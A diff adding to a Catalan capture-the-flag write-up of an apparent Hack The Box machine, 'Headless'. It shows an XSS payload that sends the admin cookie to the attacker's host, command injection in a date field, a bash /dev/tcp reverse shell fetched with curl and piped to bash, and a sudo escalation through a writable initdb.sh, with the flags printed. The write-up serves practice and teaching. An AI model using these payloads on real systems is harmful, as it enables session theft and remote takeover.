@@ -151,5 +151,339 @@ Al fer-ho l'atac XSS ens retorna el següent missatge:
 
 El missatge ens diu que la nostre IP s'ha marcat i s'ha enviat un informe als administradors del lloc web perquè investiguin el cas.
 
+Veiem que la cookie és admin, podríem mirar d'utilitzar-la posantl-la al payload i a User-Agent que és on ens ha funcionat mentre escoltavem des de la nostra màquina i hem obtingut una cookie d'usuari admin:
 
+```
+`┌──(root㉿kali)-[/home/polkali]
+└─# python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+10.10.11.8 - - [07/Apr/2024 12:34:56] code 404, message File not found
+10.10.11.8 - - [07/Apr/2024 12:34:56] "GET /is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 404 -`
+```
+
+
+```
+`POST /support HTTP/1.1
+
+Host: 10.10.11.8:5000
+
+User-Agent: <img src=x onerror=fetch('http://10.10.14.198:4444/'+document.cookie);>
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 310
+
+Origin: http://10.10.11.8:5000
+
+Connection: close
+
+Referer: http://10.10.11.8:5000/support
+
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+
+Upgrade-Insecure-Requests: 1
+
+
+
+fname=%60%60%3Cscript%3Ealert%28%22hacked%22%29%3C%2Fscript%3E%60%60&lname=%60%60%3Cscript%3Ealert%28%22hacked%22%29%3C%2Fscript%3E%60%60&email=prova%40proca.com&phone=%60%60%3Cscript%3Ealert%28%22hacked%22%29%3C%2Fscript%3E%60%60&message=<img src=x onerror=fetch('http://10.10.14.198:4444/'+document.cookie);>`
+```
+
+
+Ara provem la cookie trobada d'usuari administrador a veure si ens serveix per accedir al dashboard. Quan accedim al directori /dashboard amb la cookie per defecte no ens hi deixa accedir:
+
+![[Pasted image 20240407124227.png]]
+
+![[Pasted image 20240407124241.png]]
+
+Quan posem la cookie que hem obtingut d'usuari administrador ja ens hi deixa accedir al /dashboard:
+
+![[Pasted image 20240407124526.png]]
+
+![[Pasted image 20240407124539.png]]
+
+Un cop aquí veiem el dashboard on se'ns permet generar un report, anem a veure a on ens porta el botó de generar report (utilitzant la cookie d'admin):
+
+![[Pasted image 20240407124709.png]]
+
+Sembla que des d'aquí podrem accedir a la màquina, de moment només ens deixa seleccionar la data, i veiem que amb la petició al clicar al botó blau fa un POST i posa la data: 
+
+![[Pasted image 20240407125212.png]]
+
+Per tant mirarem de modificar la petició post i posar alguna comanda com per exemple 'id' a veure què ens retorna.
+
+Després de fer proves, veiem que s'ha de posar la comanda darrere la data, amb un ; que ho separi:
+
+![[Pasted image 20240407125513.png]]
+
+I obtenim resposta!!
+
+![[Pasted image 20240407125528.png]]
+
+Ara doncs, haurem de mirar de trobar/crear una comanda que ens faci una reverse shell. Primer obrirem un terminal a la nostra màquina per escoltar per el port 4444 per exemple:
+
+```
+`┌──(root㉿kali)-[/home/polkali]
+└─# nc -lvp 4444                
+listening on [any] 4444 ...`
+```
+
+I ara hem trobat aquesta shell i la utilitzarem https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp : 
+
+``bash -i >& /dev/tcp/10.10.14.198/4444 0>&1``
+
+Preparem la petició post que es genera al clicar el botó blau on s'hi posa la data:
+
+```
+`POST /dashboard HTTP/1.1
+
+Host: 10.10.11.8:5000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 15
+
+Origin: http://10.10.11.8:5000
+
+Connection: close
+
+Referer: http://10.10.11.8:5000/dashboard
+
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+Upgrade-Insecure-Requests: 1
+
+
+
+date=2023-09-15;bash -c 'bash -i &>/dev/tcp/10.10.14.198/4444 <&1'
+```
+
+No ha funcionat. Provarem de crear el fitxer a la nostra màquina i modificar la petició POST posant curl per poder accedir al fitxer que creem.
+
+Creem el fitxer:
+
+```
+┌──(root㉿kali)-[/]
+└─# cat reverseshell.sh      
+#!/bin/bash
+bash -c 'bash -i &>/dev/tcp/10.10.14.198/4444 <&1'
+
+```
+
+I és molt important otorgar-li permisos d'execució:
+
+```
+┌──(root㉿kali)-[/home/polkali/Documents/Headless]
+└─# chmod +x reverseshell.sh `
+```
+
+I mourem el fitxer creat a l'arrel de la nostra màquina per no haver de posar tants directoris al curl, i ara provarem si funciona. 
+
+IMPORTANT aixercar servidor web perquè la màquina víctima pugui amb curl agafar el fitxer que carreguem .sh:
+
+``sudo python3 -m http.server 80``
+
+Un cop fet això ja podem modificar la petició POST posant la comanda curl perquè agafi el fitxer que hem generat .sh a través del servidor http que hem muntat amb python:
+
+```
+POST /dashboard HTTP/1.1
+
+Host: 10.10.11.8:5000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 15
+
+Origin: http://10.10.11.8:5000
+
+Connection: close
+
+Referer: http://10.10.11.8:5000/dashboard
+
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+Upgrade-Insecure-Requests: 1
+
+
+
+date=2023-09-15;curl http://10.10.14.198/reverseshell.sh|bash
+````
+
+Mentre des de la nostra màquina estem escoltant:
+
+```
+┌──(root㉿kali)-[/home/polkali]
+└─# nc -nlvp 4444  
+listening on [any] 4444 ...`
+```
+
+I un cop enviem la petició aconseguim la shell:
+
+```
+`┌──(root㉿kali)-[/home/polkali]
+└─# nc -nlvp 4444  
+listening on [any] 4444 ...
+connect to [10.10.14.198] from (UNKNOWN) [10.10.11.8] 41022
+bash: cannot set terminal process group (1337): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.2$ whoami
+whoami
+dvir
+bash-5.2$ `
+```
+
+I podem obtenir la **flag d'user**:
+
+```
+bash-5.2$ pwd
+pwd
+/home/dvir/app
+bash-5.2$ ls
+ls
+app.py
+dashboard.html
+hackattempt.html
+hacking_reports
+index.html
+initdb.sh
+inspect_reports.py
+report.sh
+rev.sh
+support.html
+bash-5.2$ cd /home/dvir
+cd /home/dvir
+bash-5.2$ ls
+ls
+app
+geckodriver.log
+initdb,sh
+initdb.sh
+user.txt
+bash-5.2$ cat user.txt
+cat user.txt
+9b95c4181e62c2e21bf56223a208c51f
+bash-5.2$ 
+```
+
+Ara, mirarem d'escalar privilegis per obtenir la flag de l'usuari root. El primer que fem es veure sobre on tenim permisos:
+
+```
+`bash-5.2$ sudo -l
+sudo -l
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck
+bash-5.2$ `
+```
+
+I veiem que l'usuari "dvir" té permisos per executar la comanda /usr/bin/syscheck amb privilegis d'administrador ((ALL) NOPASSWD: /usr/bin/syscheck) a la màquina "headless" sense necessitat de proporcionar una contrasenya.
+
+Ara doncs mirare com podem escalar privilegis a través d'això, el primer que fem és anar a veure aquest fitxer a veure què conte:
+
+```
+cat /usr/bin/syscheck
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+  /usr/bin/echo "Database service is not running. Starting it..."
+  ./initdb.sh 2>/dev/null
+else
+  /usr/bin/echo "Database service is running."
+fi
+
+exit 0
+````
+
+Veiem que executa l'script initdb.sh, per tant podem mirar de modificar-lo/crear-lo a veure si així podem accedir a l'usuari root. Primer he buscat el fitxer amb un find i l'he trobat:
+
+```
+bash-5.2$ find / -name "initdb.sh" 2>/dev/null
+find / -name "initdb.sh" 2>/dev/null
+/home/dvir/initdb.sh
+/home/dvir/app/initdb.sh
+bash-5.2$ 
+```
+
+Posem /bin/bash a l'script initdb.sh:
+
+```
+`bash-5.2$ echo "/bin/bash" > initdb.sh
+echo "/bin/bash" > initdb.sh
+bash-5.2$ chmod +x initdb.sh
+chmod +x initdb.sh`
+```
+
+I ara executem el fitxer sobre els quals tenim permisos sudo /usr/bin/syscheck que executarà l'script que utilitzem per tenir permisos root. Amb comanda sudo /usr/bin/syscheck executem  l'script /usr/bin/syscheck amb privilegis d'administrador utilitzant sudo.
+
+Dins de l'script syscheck, hi ha una secció que comprova si l'usuari és root. Si l'usuari és root, executa la comanda ./initdb.sh. Com ara el contingut de initdb.sh és /bin/bash, quan aquesta comanda s'executa, obre un nou shell Bash.
+
+Un cop dins del shell Bash obert amb initdb.sh, hem executat la comanda whoami, que mostra l'usuari actual, i ha retornat root, indicant que ara som l'usuari root.
+
+```
+`bash-5.2$ sudo /usr/bin/syscheck
+sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.4G
+System load average:  0.19, 0.11, 0.06
+Database service is not running. Starting it...
+whoami
+root`
+```
+
+I ja podem aconseguir **la flag root**:
+
+```
+bash-5.2$ sudo /usr/bin/syscheck
+sudo /usr/bin/syscheck
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.4G
+System load average:  0.19, 0.11, 0.06
+Database service is not running. Starting it...
+whoami
+root
+cd /root
+ls
+root.txt
+cat root.txt
+b6cf3b925eee77c38ca7244975b4a38f`
+```
 
